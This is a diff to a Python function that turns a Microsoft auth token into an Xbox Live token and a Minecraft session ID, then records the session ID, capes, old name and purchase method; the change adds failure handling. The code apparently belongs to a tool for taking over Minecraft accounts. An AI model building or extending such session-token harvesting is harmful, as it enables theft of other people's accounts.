@@ -52,31 +52,47 @@ def secure(msaauth: str):
     
     print("[~] - Checking Minecraft Account")
     XBLResponse = getXBL(host)
-    
-    xbl = XBLResponse["xbl"]
-    ssid =  getSSID(xbl)
 
-    if ssid:
-        print("[+] - Got SSID!")
-        accountInfo["SSID"] = ssid
-
-        # Might replace with a non ssid request (uuid based)
-        capes = getCapes(ssid)
-        if capes:
-            accountInfo["capes"] = ", ".join(i["alias"] for i in capes)
-        else:
-            accountInfo["capes"] = "No Capes"
+    if XBLResponse:
+        # XBL && Token
+        xbl = XBLResponse["xbl"]
+        ssid =  getSSID(xbl)
         
-        profile = getProfile(ssid)
-        if not profile:
-            accountInfo["oldName"] = "No Minecraft"
-            print("[x] - Failed to get profile")
-        else:
-            print(f"[+] - Got profile")
-            accountInfo["oldName"] = profile
+        # Get capes, profile and purchase method
+        if ssid:
+            print("[+] - Got SSID!")
+            accountInfo["SSID"] = ssid
 
-        method = getMethod(ssid)
-            
+            # Might replace with a non ssid request (uuid based)
+            capes = getCapes(ssid)
+            if capes:
+                accountInfo["capes"] = ", ".join(i["alias"] for i in capes)
+            else:
+                accountInfo["capes"] = "No Capes"
+
+            profile = getProfile(ssid)
+            if not profile:
+                accountInfo["oldName"] = "No Minecraft"
+                print("[x] - Failed to get profile")
+            else:
+                print(f"[+] - Got profile")
+                accountInfo["oldName"] = profile
+
+            method = getMethod(ssid)
+            if method:
+                accountInfo["method"] = method
+        else:
+            print("[x] - Failed to get SSID")
+
+    else:
+        print("[x] - Failed to get XBL")
+        accountInfo["oldName"] = "No Minecraft"
+
+    
+
+    
+
+    
         
 
         
